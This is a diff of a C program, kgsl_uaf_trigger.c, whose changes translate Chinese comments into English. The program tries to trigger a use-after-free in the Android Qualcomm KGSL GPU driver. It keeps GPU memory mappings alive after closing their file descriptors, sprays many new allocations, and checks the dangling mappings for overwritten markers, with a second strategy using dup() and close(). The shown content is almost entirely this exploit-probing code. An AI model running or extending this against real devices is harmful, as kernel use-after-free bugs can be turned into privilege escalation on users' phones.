@@ -1,12 +1,12 @@
 /*
- * kgsl_uaf_trigger.c - 嘗試觸發 UAF
+ * kgsl_uaf_trigger.c - attempt to trigger a UAF
  *
- * 策略:
- * 1. 打開 fd2, 分配記憶體, mmap, 關閉 fd2
- * 2. 大量分配新的記憶體試圖重用
- * 3. 檢查舊的 mmap 是否被覆蓋
+ * Strategy:
+ * 1. Open fd2, allocate memory, mmap, then close fd2
+ * 2. Allocate a lot of new memory to try to reuse it
+ * 3. Check whether the old mmap was overwritten
  *
- * 編譯:
+ * Build:
  * aarch64-linux-android31-clang -static -O2 -o kgsl_uaf_trigger kgsl_uaf_trigger.c
  */
 
@@ -72,7 +72,7 @@ int main(int argc, char **argv)
     }
     printf("[+] Main fd=%d\n", fd);
 
-    // 策略 1: 使用多個 fd
+    // Strategy 1: use multiple fds
     printf("\n=== Strategy 1: Multiple FD Close ===\n");
 
     void *dangling_ptrs[10];
@@ -101,7 +101,7 @@ int main(int argc, char **argv)
             continue;
         }
 
-        // 寫入獨特標記
+        // Write a unique marker
         markers[i] = 0xDEAD0000 + i;
         *(volatile uint64_t *)ptr = markers[i];
 
@@ -110,13 +110,13 @@ int main(int argc, char **argv)
         printf("[*] fd%d: gpuaddr=0x%lx, ptr=%p, marker=0x%lx\n",
                i, req.gpuaddr, ptr, markers[i]);
 
-        // 關閉 fd (但保持 mmap)
+        // Close the fd (but keep the mmap)
         close(fd_temp);
     }
 
     printf("\n[*] All fds closed, now allocating new memory...\n");
 
-    // 大量分配新記憶體
+    // Allocate a lot of new memory
     for (int i = 0; i < 1000; i++)
     {
         struct kgsl_gpumem_alloc req = {0};
@@ -131,7 +131,7 @@ int main(int argc, char **argv)
                          MAP_SHARED, fd, req.gpuaddr);
         if (ptr != MAP_FAILED)
         {
-            // 用新數據填充
+            // Fill with new data
             memset(ptr, 0x42, 0x1000);
             munmap(ptr, 0x1000);
         }
@@ -171,7 +171,7 @@ int main(int argc, char **argv)
         }
     }
 
-    // 策略 2: 使用 dup() 和 close
+    // Strategy 2: use dup() and close
     printf("\n=== Strategy 2: dup() and close ===\n");
 
     int fd2 = open("/dev/kgsl-3d0", O_RDWR);
@@ -193,11 +193,11 @@ int main(int argc, char **argv)
             *(volatile uint64_t *)ptr2 = 0xBEEFCAFE;
             printf("[+] mmap on fd2: ptr=%p\n", ptr2);
 
-            // 關閉 fd2，但 fd3 仍然有效
+            // Close fd2 while fd3 is still valid
             close(fd2);
             printf("[*] fd2 closed, fd3 still open\n");
 
-            // 通過 fd3 嘗試操作
+            // Try operations through fd3
             struct kgsl_gpumem_alloc req3 = {0};
             req3.size = 0x1000;
 
@@ -206,7 +206,7 @@ int main(int argc, char **argv)
                 printf("[+] Allocated on fd3: 0x%lx\n", req3.gpuaddr);
             }
 
-            // 檢查 ptr2
+            // Check ptr2
             uint64_t val;
             if (safe_read_u64(ptr2, &val) == 0)
             {
@@ -219,7 +219,7 @@ int main(int argc, char **argv)
         close(fd3);
     }
 
-    // 清理懸空指針
+    // Clean up the dangling pointer
     for (int i = 0; i < 10; i++)
     {
         if (dangling_ptrs[i])
